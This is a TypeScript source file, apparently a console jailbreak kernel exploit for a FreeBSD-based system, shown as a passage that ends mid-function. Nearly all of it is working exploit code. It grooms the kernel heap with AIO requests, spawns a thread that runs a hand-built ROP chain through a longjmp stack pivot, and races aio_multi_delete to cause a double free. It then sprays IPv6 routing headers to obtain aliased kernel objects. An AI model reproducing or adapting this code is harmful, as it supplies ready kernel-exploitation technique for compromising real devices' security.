import { fn, BigInt, syscalls, gadgets, mem, rop, utils } from 'download0/types'
import { kernel, apply_kernel_patches, hex, malloc, read16, read32, read64, read8, write16, write32, write64, write8, get_fwversion, send_notification, get_kernel_offset, get_mmap_patch_offsets } from 'download0/kernel'
import { libc_addr } from 'download0/userland'

include('kernel.js')

if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart (targetLength, padString) {
    targetLength = targetLength >> 0 // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ')
    if (this.length > targetLength) {
      return String(this)
    } else {
      targetLength = targetLength - this.length
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length) // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this)
    }
  }
}

let FW_VERSION: string | null = null

const PAGE_SIZE = 0x4000

const MAIN_CORE = 4
const MAIN_RTPRIO = 0x100
const NUM_WORKERS = 2
const NUM_GROOMS = 0x200
const NUM_HANDLES = 0x100
const NUM_SDS = 64
const NUM_SDS_ALT = 48
const NUM_RACES = 100
const NUM_ALIAS = 100
const LEAK_LEN = 16
const NUM_LEAKS = 32
const NUM_CLOBBERS = 8
const MAX_AIO_IDS = 0x80

const AIO_CMD_READ = 1
const AIO_CMD_FLAG_MULTI = 0x1000
const AIO_CMD_MULTI_READ = 0x1001
const AIO_CMD_WRITE = 2
const AIO_STATE_COMPLETE = 3
const AIO_STATE_ABORTED = 4

const SCE_KERNEL_ERROR_ESRCH = 0x80020003

const RTP_LOOKUP = 0
const RTP_SET = 1
const PRI_REALTIME = 2

let block_fd = 0xffffffff
let unblock_fd = 0xffffffff
let block_id = 0xffffffff
let groom_ids: number[] | null = null
let sds: [BigInt, BigInt] | null = null
let sds_alt: [BigInt, BigInt] | null = null
let prev_core = -1
let prev_rtprio = 0
let ready_signal = new BigInt(0)
let deletion_signal = new BigInt(0)
let pipe_buf = new BigInt(0)
let sd_pair: [BigInt, BigInt] | null = null

let saved_fpu_ctrl = 0
let saved_mxcsr = 0

// Socket constants - only define if not already in scope
// (inject.js defines some of these as const in the eval scope)
const AF_UNIX = 1
const AF_INET = 2
const AF_INET6 = 28

const SOCK_STREAM = 1
const SOCK_DGRAM = 2

const IPPROTO_TCP = 6
const IPPROTO_UDP = 17
const IPPROTO_IPV6 = 41

const SOL_SOCKET = 0xFFFF
const SO_REUSEADDR = 4
const SO_LINGER = 0x80

// IPv6 socket options
const IPV6_PKTINFO = 46
const IPV6_NEXTHOP = 48
const IPV6_RTHDR = 51
const IPV6_TCLASS = 61
const IPV6_2292PKTOPTIONS = 25

// TCP socket options
const TCP_INFO = 32
const TCPS_ESTABLISHED = 4
const size_tcp_info = 0xec  /* struct tcp_info */

// Create shorthand references
fn.register(42, 'pipe', ['bigint'], 'bigint')
const pipe = fn.pipe
fn.register(20, 'getpid', [], 'bigint')
const getpid = fn.getpid
fn.register(0x18, 'getuid', [], 'bigint')
const getuid = fn.getuid
fn.register(98, 'connect', ['bigint', 'bigint', 'number'], 'bigint')
const connect = fn.connect
fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint')
const munmap = fn.munmap
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint')
const getsockopt = fn.getsockopt
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
const socketpair = fn.socketpair
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
const nanosleep = fn.nanosleep
fn.register(0x1C7, 'thr_new', ['bigint', 'bigint'], 'bigint')
const thr_new = fn.thr_new
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')
const rtprio_thread = fn.rtprio_thread
fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint')
const mmap = fn.mmap
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_getaffinity = fn.cpuset_getaffinity
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_setaffinity = fn.cpuset_setaffinity

fn.register(0x21A, 'evf_create', ['bigint', 'number', 'number'], 'bigint')
const evf_create = fn.evf_create
fn.register(0x220, 'evf_set', ['bigint', 'number'], 'bigint')
const evf_set = fn.evf_set
fn.register(0x221, 'evf_clear', ['bigint', 'number'], 'bigint')
const evf_clear = fn.evf_clear
fn.register(0x21b, 'evf_delete', ['bigint'], 'bigint')
const evf_delete = fn.evf_delete

fn.register(0x249, 'is_in_sandbox', [], 'bigint')
const is_in_sandbox = fn.is_in_sandbox
fn.register(0x279, 'thr_resume_ucontext', ['bigint'], 'bigint')
const thr_resume_ucontext = fn.thr_resume_ucontext

fn.register(0x296, 'aio_multi_delete', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_delete = fn.aio_multi_delete
fn.register(0x297, 'aio_multi_wait', ['bigint', 'number', 'bigint', 'number', 'number'], 'bigint')
const aio_multi_wait = fn.aio_multi_wait
fn.register(0x298, 'aio_multi_poll', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_poll = fn.aio_multi_poll
fn.register(0x29A, 'aio_multi_cancel', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_cancel = fn.aio_multi_cancel
fn.register(0x29D, 'aio_submit_cmd', ['number', 'bigint', 'number', 'number', 'bigint'], 'bigint')
const aio_submit_cmd = fn.aio_submit_cmd

fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
const socket = fn.socket
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint')
const setsockopt = fn.setsockopt
fn.register(0x68, 'bind', ['bigint', 'bigint', 'number'], 'bigint')
const bind = fn.bind
fn.register(0x3, 'read', ['bigint', 'bigint', 'bigint'], 'bigint')
const read = fn.read
fn.register(0x4, 'write', ['bigint', 'bigint', 'bigint'], 'bigint')
const write = fn.write
fn.register(0x6, 'close', ['bigint'], 'bigint')
const close = fn.close
fn.register(0x1e, 'accept', ['bigint', 'bigint', 'bigint'], 'bigint')
const accept = fn.accept
fn.register(0x6a, 'listen', ['bigint', 'number'], 'bigint')
const listen = fn.listen
fn.register(0x20, 'getsockname', ['bigint', 'bigint', 'bigint'], 'bigint')
const getsockname = fn.getsockname

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint')
const setjmp = fn.setjmp
const longjmp_addr = libc_addr.add(0x6CA50)

// Extract syscall wrapper addresses for ROP chains from syscalls.map
const read_wrapper = syscalls.map.get(0x03)
const write_wrapper = syscalls.map.get(0x04)
const sched_yield_wrapper = syscalls.map.get(0x14b)
const thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)
const rtprio_thread_wrapper = syscalls.map.get(0x1D2)
const aio_multi_delete_wrapper = syscalls.map.get(0x296)
const thr_exit_wrapper = syscalls.map.get(0x1af)

const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)

function init_threading () {
  const jmpbuf = malloc(0x60)
  setjmp(jmpbuf)
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)))
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)))
}

function pin_to_core (core: number) {
  const mask = malloc(0x10)
  write32(mask, 1 << core)
  cpuset_setaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask)
}

function get_core_index (mask_addr: BigInt) {
  let num = read32(mask_addr)
  let position = 0
  while (num > 0) {
    num = num >>> 1
    position++
  }
  return position - 1
}

function get_current_core () {
  const mask = malloc(0x10)
  cpuset_getaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask)
  return get_core_index(mask)
}

function set_rtprio (prio: number) {
  const rtprio = malloc(0x4)
  write16(rtprio, PRI_REALTIME)
  write16(rtprio.add(2), prio)
  rtprio_thread(RTP_SET, 0, rtprio)
}

function get_rtprio () {
  const rtprio = malloc(0x4)
  write16(rtprio, PRI_REALTIME)
  write16(rtprio.add(2), 0)
  rtprio_thread(RTP_LOOKUP, 0, rtprio)
  return Number(read16(rtprio.add(2)))
}

function aio_submit_cmd_fun (cmd: number, reqs: BigInt, num_reqs: number, priority: number, ids: BigInt) {
  const result = aio_submit_cmd(cmd, reqs, num_reqs, priority, ids)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_submit_cmd error: ' + hex(result))
  }
  return result
}

function aio_multi_cancel_fun (ids: BigInt, num_ids: number, states: BigInt) {
  const result = aio_multi_cancel(ids, num_ids, states)
  if (result.eq(BigInt_Error)) {
    throw new Error('aio_multi_cancel error: ' + hex(result))
  }
  return result
}

function aio_multi_poll_fun (ids: BigInt, num_ids: number, states: BigInt) {
  const result = aio_multi_poll(ids, num_ids, states)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_poll error: ' + hex(result))
  }
  return result
}

function aio_multi_wait_fun (ids: BigInt, num_ids: number, states: BigInt, mode: number, timeout: number) {
  const result = aio_multi_wait(ids, num_ids, states, mode, timeout)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_wait error: ' + hex(result))
  }
  return result
}

function aio_multi_delete_fun (ids: BigInt, num_ids: number, states: BigInt) {
  const result = aio_multi_delete(ids, num_ids, states)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('aio_multi_delete error: ' + hex(result))
  }
  return result
}

function make_reqs1 (num_reqs: number) {
  const reqs = malloc(0x28 * num_reqs)
  for (let i = 0; i < num_reqs; i++) {
    write32(reqs.add(i * 0x28 + 0x20), 0xFFFFFFFF)
  }
  return reqs
}

function spray_aio (loops: number, reqs: BigInt, num_reqs: number, ids: BigInt, multi: boolean, cmd: number = AIO_CMD_READ) {
  loops = loops || 1
  if (multi === undefined) multi = true

  const step = 4 * (multi ? num_reqs : 1)
  const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0)

  for (let i = 0; i < loops; i++) {
    aio_submit_cmd_fun(final_cmd, reqs, num_reqs, 3, new BigInt(Number(ids) + (i * step)))
  }
}

function cancel_aios (ids: BigInt, num_ids: number) {
  const len = MAX_AIO_IDS
  const rem = num_ids % len
  const num_batches = Math.floor((num_ids - rem) / len)

  const errors = malloc(4 * len)

  for (let i = 0; i < num_batches; i++) {
    aio_multi_cancel_fun(new BigInt(Number(ids) + (i * 4 * len)), len, errors)
  }

  if (rem > 0) {
    aio_multi_cancel_fun(new BigInt(Number(ids) + (num_batches * 4 * len)), rem, errors)
  }
}

function free_aios (ids: BigInt, num_ids: number, do_cancel: boolean = true) {
  const len = MAX_AIO_IDS
  const rem = num_ids % len
  const num_batches = Math.floor((num_ids - rem) / len)

  const errors = malloc(4 * len)

  for (let i = 0; i < num_batches; i++) {
    const addr = new BigInt(Number(ids) + i * 4 * len)
    if (do_cancel) {
      aio_multi_cancel_fun(addr, len, errors)
    }
    aio_multi_poll_fun(addr, len, errors)
    aio_multi_delete_fun(addr, len, errors)
  }

  if (rem > 0) {
    const addr = new BigInt(Number(ids) + (num_batches * 4 * len))
    if (do_cancel) {
      aio_multi_cancel_fun(addr, rem, errors)
    }
    aio_multi_poll_fun(addr, rem, errors)
    aio_multi_delete_fun(addr, rem, errors)
  }
}

function free_aios2 (ids: BigInt, num_ids: number) {
  free_aios(ids, num_ids, false)
}

function aton (ip_str: string) {
  const parts = ip_str.split('.').map(Number)
  if (parts.length !== 4 || parts.some(part => isNaN(part) || part < 0 || part > 255)) {
    throw new Error('Invalid IPv4 address: ' + ip_str)
  }
  return (parts[3]! << 24) | (parts[2]! << 16) | (parts[1]! << 8) | parts[0]!
}

function new_tcp_socket () {
  const sd = socket(AF_INET, SOCK_STREAM, 0)
  if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('new_tcp_socket error: ' + hex(sd))
  }
  return sd
}

function new_socket () {
  const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
  if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('new_socket error: ' + hex(sd))
  }
  return sd
}

function create_pipe () {
  const fildes = malloc(0x10)
  const result = pipe(fildes)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('pipe syscall failed')
  }
  const read_fd = new BigInt(read32(fildes))         // easier to have BigInt for upcoming usage
  const write_fd = new BigInt(read32(fildes.add(4)))  // easier to have BigInt for upcoming usage
  return [read_fd, write_fd]
}

function spawn_thread (rop_race1_array: BigInt[]) {
  const rop_race1_addr = malloc(0x400) // ROP Stack plus extra size
  // log("This is rop_race1_array.length " + rop_race1_array.length);
  // Fill ROP Stack
  for (let i = 0; i < rop_race1_array.length; i++) {
    write64(rop_race1_addr.add(i * 8), rop_race1_array[i]!)
    // log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
  }

  const jmpbuf = malloc(0x60)

  // FreeBSD amd64 jmp_buf layout:
  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
  write64(jmpbuf.add(0x00), gadgets.RET)         // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_race1_addr)      // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl) // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr)    // MXCSR

  const stack_size = new BigInt(0x400)
  const tls_size = new BigInt(0x40)

  const thr_new_args = malloc(0x80)
  const tid_addr = malloc(0x8)
  const cpid = malloc(0x8)
  const stack = malloc(Number(stack_size))
  const tls = malloc(Number(tls_size))

  write64(thr_new_args.add(0x00), longjmp_addr)       // start_func = longjmp
  write64(thr_new_args.add(0x08), jmpbuf)             // arg = jmpbuf
  write64(thr_new_args.add(0x10), stack)              // stack_base
  write64(thr_new_args.add(0x18), stack_size)         // stack_size
  write64(thr_new_args.add(0x20), tls)                // tls_base
  write64(thr_new_args.add(0x28), tls_size)           // tls_size
  write64(thr_new_args.add(0x30), tid_addr)           // child_tid (output)
  write64(thr_new_args.add(0x38), cpid)               // parent_tid (output)

  const result = thr_new(thr_new_args, new BigInt(0x68))
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result))
  }

  return read64(tid_addr)
}

function nanosleep_fun (nsec: number) {
  const timespec = malloc(0x10)
  write64(timespec, Math.floor(nsec / 1e9))    // tv_sec
  write64(timespec.add(8), nsec % 1e9)         // tv_nsec
  nanosleep(timespec)
}

function wait_for (addr: BigInt, threshold: number) {
  while (!read64(addr).eq(new BigInt(threshold))) {
    nanosleep_fun(1)
  }
}

function call_suspend_chain (pipe_write_fd: BigInt, pipe_buf: BigInt, thr_tid: BigInt) {
  const insts = []

  if (!sched_yield_wrapper || !thr_suspend_ucontext_wrapper || !write_wrapper) {
    throw new Error('Required syscall wrappers not available for ROP chain')
  }

  // write(pipe_write_fd, pipe_buf, 1) - using per-syscall gadget
  insts.push(gadgets.POP_RDI_RET)
  insts.push(pipe_write_fd)
  insts.push(gadgets.POP_RSI_RET)
  insts.push(pipe_buf)
  insts.push(gadgets.POP_RDX_RET)
  insts.push(new BigInt(1))
  insts.push(write_wrapper)

  // sched_yield() - using per-syscall gadget
  insts.push(sched_yield_wrapper)

  // thr_suspend_ucontext(thr_tid) - using per-syscall gadget
  insts.push(gadgets.POP_RDI_RET) // pop rdi ; ret
  insts.push(thr_tid)
  insts.push(thr_suspend_ucontext_wrapper)

  // return value in rax is stored by rop.store()

  const store_size = 0x10 // 2 slots 1 for RBP and another for last syscall ret value
  const store_addr = mem.malloc(store_size)

  rop.store(insts, store_addr, 1)

  rop.execute(insts, store_addr, store_size)

  return read64(store_addr.add(8)) // return value for 2nd slot
}

function race_one (req_addr: BigInt, tcp_sd: BigInt, sds: BigInt[]): [BigInt, BigInt] | null {
  try {
    if (!cpuset_setaffinity_wrapper || !rtprio_thread_wrapper || !read_wrapper || !aio_multi_delete_wrapper || !thr_exit_wrapper) {
      throw new Error('Required syscall wrappers not available for ROP chain')
    }

    // log("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
    write64(ready_signal, 0)
    write64(deletion_signal, 0)

    const sce_errs = malloc(0x100)  // 8 bytes for errs + scratch for TCP_INFO
    write32(sce_errs, 0xFFFFFFFF)  // -1
    write32(sce_errs.add(4), 0xFFFFFFFF)  // -1
    // log("race_one before pipe");
    const pipe_fds = create_pipe()
    const pipe_read_fd = pipe_fds[0]!
    const pipe_write_fd = pipe_fds[1]!
    // const [pipe_read_fd, pipe_write_fd] = create_pipe();
    // log("race_one after pipe");

    const rop_race1: BigInt[] = []

    rop_race1.push(new BigInt(0)) // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10)
    write16(cpu_mask, 1 << MAIN_CORE)

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(new BigInt(3))                        // CPU_LEVEL_WHICH
    rop_race1.push(gadgets.POP_RSI_RET)
    rop_race1.push(new BigInt(1))                        // CPU_WHICH_TID
    rop_race1.push(gadgets.POP_RDX_RET)
    rop_race1.push(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))   // id = -1 (current thread)
    rop_race1.push(gadgets.POP_RCX_RET)
    rop_race1.push(new BigInt(0x10))                     // setsize
    rop_race1.push(gadgets.POP_R8_RET)
    rop_race1.push(cpu_mask)
    rop_race1.push(cpuset_setaffinity_wrapper)

    const rtprio_buf = malloc(4)
    write16(rtprio_buf, PRI_REALTIME)
    write16(rtprio_buf.add(2), MAIN_RTPRIO)

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(new BigInt(1))         // RTP_SET
    rop_race1.push(gadgets.POP_RSI_RET)
    rop_race1.push(new BigInt(0))         // lwpid = 0 (current thread)
    rop_race1.push(gadgets.POP_RDX_RET)
    rop_race1.push(rtprio_buf)
    rop_race1.push(rtprio_thread_wrapper)

    // Signal ready - write 1 to ready_signal
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(ready_signal)
    rop_race1.push(gadgets.POP_RAX_RET)
    rop_race1.push(new BigInt(1))
    rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

    // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(pipe_read_fd)
    rop_race1.push(gadgets.POP_RSI_RET)
    rop_race1.push(pipe_buf)
    rop_race1.push(gadgets.POP_RDX_RET)
    rop_race1.push(new BigInt(1))
    rop_race1.push(read_wrapper)

    // aio multi delete - aio_multi_delete(req_addr, 1, sce_errs + 4)
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(req_addr)
    rop_race1.push(gadgets.POP_RSI_RET)
    rop_race1.push(new BigInt(1))
    rop_race1.push(gadgets.POP_RDX_RET)
    rop_race1.push(sce_errs.add(4))
    rop_race1.push(aio_multi_delete_wrapper)

    // Signal deletion - write 1 to deletion_signal
    rop_race1.push(gadgets.POP_RDI_RET) // pop rdi ; ret
    rop_race1.push(deletion_signal)
    rop_race1.push(gadgets.POP_RAX_RET)
    rop_race1.push(new BigInt(1))
    rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

    // Thread exit - thr_exit(0)
    rop_race1.push(gadgets.POP_RDI_RET)
    rop_race1.push(new BigInt(0))
    rop_race1.push(thr_exit_wrapper)

    // log("race_one before spawnt_thread");
    const thr_tid = spawn_thread(rop_race1)
    // log("race_one after spawnt_thread");

    // Wait for thread to signal ready
    wait_for(ready_signal, 1)
    // log("race_one after wait_for");

    const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid)
    log('Suspend result: ' + hex(suspend_res))
    // log("race_one after call_suspend_chain");

    const scratch = sce_errs.add(8)  // Use offset for scratch space
    aio_multi_poll_fun(req_addr, 1, scratch)
    const poll_res = read32(scratch)
    log('poll_res after suspend: ' + hex(poll_res))
    // log("race_one after aio_multi_poll_fun");

    get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info)
    const tcp_state = read8(scratch)
    log('tcp_state: ' + hex(tcp_state))

    let won_race = false

    if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      aio_multi_delete_fun(req_addr, 1, sce_errs)
      won_race = true
      log('Race won!')
    } else {
      log('Race not won (poll_res=' + hex(poll_res) + ' tcp_state=' + hex(tcp_state) + ')')
    }

    const resume_result = thr_resume_ucontext(thr_tid)
    log('Resume ' + hex(thr_tid) + ': ' + resume_result)
    // log("race_one after thr_resume_ucontext");
    nanosleep_fun(5)

    if (won_race) {
      const err_main_thr = read32(sce_errs)
      const err_worker_thr = read32(sce_errs.add(4))
      log('sce_errs: main=' + hex(err_main_thr) + ' worker=' + hex(err_worker_thr))

      if (err_main_thr === err_worker_thr && err_main_thr === 0) {
        log('Double-free successful, making aliased rthdrs...')
        const sd_pair = make_aliased_rthdrs(sds)

        if (sd_pair !== null) {
          close(pipe_read_fd)
          close(pipe_write_fd)
          return sd_pair
        } else {
          log('Failed to make aliased rthdrs')
        }
      } else {
        log('sce_errs mismatch - race failed')
      }
    }

    close(pipe_read_fd)
    close(pipe_write_fd)

    return null
  } catch (e) {
    log('  race_one error: ' + (e as Error).message)
    return null
  }
}

function build_rthdr (buf: BigInt, size: number) {
  const len = ((size >> 3) - 1) & ~1
  const actual_size = (len + 1) << 3
  write8(buf, 0)
  write8(buf.add(1), len)
  write8(buf.add(2), 0)
  write8(buf.add(3), len >> 1)
  return actual_size
}

function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
  const result = setsockopt(sd, level, optname, optval, optlen)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result))
  }
  return result
}

function get_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
  const len_ptr = malloc(4)
  write32(len_ptr, optlen)
  const result = getsockopt(sd, level, optname, optval, len_ptr)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('get_sockopt error: ' + hex(result))
  }
  return read32(len_ptr)
}

function set_rthdr (sd: BigInt, buf: BigInt, len: number) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function get_rthdr (sd: BigInt, buf: BigInt, max_len: number) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len)
}

function free_rthdrs (sds: BigInt[]) {
  for (const sd of sds) {
    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
    }
  }
}

function make_aliased_rthdrs (sds: BigInt[]): [BigInt, BigInt] | null {
  const marker_offset = 4
  const size = 0x80
  const buf = malloc(size)
  const rsize = build_rthdr(buf, size)

  for (let loop = 1; loop <= NUM_ALIAS; loop++) {
    for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
      const sd = sds[i - 1]!
      if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffff
        write32(buf.add(marker_offset), i)
        set_rthdr(sd, buf, rsize)
      }
    }

    for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
      const sd = sds[i - 1]!
      if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffff
        get_rthdr(sd, buf, size)
        const marker = Number(read32(buf.add(marker_offset)))

        if (marker !== i && marker > 0 && marker <= NUM_SDS) {
          const aliased_idx = marker - 1
          const aliased_sd = sds[aliased_idx]!
          if (aliased_idx >= 0 && aliased_idx < sds.length && !aliased_sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[aliased_idx] !== 0xffffffffffffffff
            log('  Aliased pktopts found')
            const sd_pair: [BigInt, BigInt] = [sd, aliased_sd]
            const max_idx = Math.max(i - 1, aliased_idx)
            const min_idx = Math.min(i - 1, aliased_idx)
            sds.splice(max_idx, 1)
            sds.splice(min_idx, 1)
            free_rthdrs(sds)
            sds.push(new_socket())
            sds.push(new_socket())
            return sd_pair
          }
        }
      }
    }
  }
  return null
}

function setup () {
  try {
    init_threading()

    ready_signal = malloc(8)
    deletion_signal = malloc(8)
    pipe_buf = malloc(8)

    write64(ready_signal, 0)
    write64(deletion_signal, 0)

    prev_core = get_current_core()
    prev_rtprio = get_rtprio()

    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)
    log('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)

    const sockpair = malloc(8)
    let ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair)
    if (!ret.eq(0)) {
      return false
    }

    block_fd = read32(sockpair)
    unblock_fd = read32(sockpair.add(4))

    const block_reqs = malloc(0x28 * NUM_WORKERS)
    for (let i = 0; i < NUM_WORKERS; i++) {
      const offset = i * 0x28
      write32(block_reqs.add(offset).add(0x08), 1)
      write32(block_reqs.add(offset).add(0x20), block_fd)
    }

    const block_id_buf = malloc(4)
    ret = aio_submit_cmd_fun(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3, block_id_buf)
    if (!ret.eq(0)) {
      return false
    }

    block_id = read32(block_id_buf)
    log('  AIO workers ready')

    const num_reqs = 3
    const groom_reqs = make_reqs1(num_reqs)
    const groom_ids_addr = malloc(4 * NUM_GROOMS)

    spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false)
    cancel_aios(groom_ids_addr, NUM_GROOMS)

    groom_ids = []
    for (let i = 0; i < NUM_GROOMS; i++) {
      groom_ids.push(Number(read32(groom_ids_addr.add(i * 4))))
    }

    sds = [new BigInt(0), new BigInt(0)]
    let sdsIdx = 0
    for (let i = 0; i < NUM_SDS; i++) {
      const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
      if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error('socket alloc failed at sds[' + i + '] - reboot system')
      }
      sds[sdsIdx++] = sd
    }

    sds_alt = [new BigInt(0), new BigInt(0)]
    let sdsAltIdx = 0
    for (let i = 0; i < NUM_SDS_ALT; i++) {
      const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
      if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error('socket alloc failed at sds_alt[' + i + '] - reboot system')
      }
      sds_alt[sdsAltIdx++] = sd
    }
    log('  Sockets allocated (' + NUM_SDS + ' + ' + NUM_SDS_ALT + ')')

    return true
  } catch (e) {
    log('  Setup failed: ' + (e as Error).message)
    return false
  }
}

function double_free_reqs2 (): [BigInt, BigInt] | null {
  try {
    const server_addr = malloc(16)
    write8(server_addr.add(1), AF_INET)
    write16(server_addr.add(2), 0)
    write32(server_addr.add(4), aton('127.0.0.1'))

    const sd_listen = new_tcp_socket()

    const enable = malloc(4)
    write32(enable, 1)
    set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4)

    let ret = bind(sd_listen, server_addr, 16)

    if (!ret.eq(0)) {
      log('bind failed')
      close(sd_listen)
      return null
    }

    const addr_len = malloc(4)
    write32(addr_len, 16)
    ret = getsockname(sd_listen, server_addr, addr_len)
    if (!ret.eq(0)) {
      log('getsockname failed')
      close(sd_listen)
      return null
    }
    log('Bound to port: ' + Number(read16(server_addr.add(2))))

    ret = listen(sd_listen, 1)
    if (!ret.eq(0)) {
      log('listen failed')
      close(sd_listen)
      return null
    }

    const num_reqs = 3
    const which_req = num_reqs - 1
    const reqs = make_reqs1(num_reqs)
    const aio_ids = malloc(4 * num_reqs)
    const req_addr = aio_ids.add(which_req * 4)
    const errors = malloc(4 * num_reqs)
    const cmd = AIO_CMD_MULTI_READ

    for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
      // log("Race attempt " + attempt + "/" + NUM_RACES);

      const sd_client = new_tcp_socket()

      ret = connect(sd_client, server_addr, 16)
      if (!ret.eq(0)) {
        close(sd_client)
        continue
      }

      const sd_conn = accept(sd_listen, new BigInt(0), new BigInt(0))
      // log("Race attempt after accept")
      const linger_buf = malloc(8)
      write32(linger_buf, 1)
      write32(linger_buf.add(4), 1)
      set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8)
      // log("Race attempt after set_sockopt")
      write32(reqs.add(which_req * 0x28 + 0x20), Number(sd_client))

      ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids)
      if (!ret.eq(0)) {
        close(sd_client)
        close(sd_conn)
        continue
      }
      // log("Race attempt after aio_submit_cmd_fun")
      aio_multi_cancel_fun(aio_ids, num_reqs, errors)
      // log("Race attempt after aio_multi_cancel_fun")
      aio_multi_poll_fun(aio_ids, num_reqs, errors)
      // log("Race attempt after aio_multi_poll_fun")

      close(sd_client)
      // log("Race attempt before race_one")
      if (!sds) {
        close(sd_conn)
        close(sd_listen)
        throw Error('sds not initialized')
      }
      const sd_pair = race_one(req_addr, sd_conn, sds)

      aio_multi_delete_fun(aio_ids, num_reqs, errors)
      close(sd_conn)

      if (sd_pair !== null) {
        log('Won race at attempt ' + attempt)
        close(sd_listen)
        return sd_pair
      }
    }

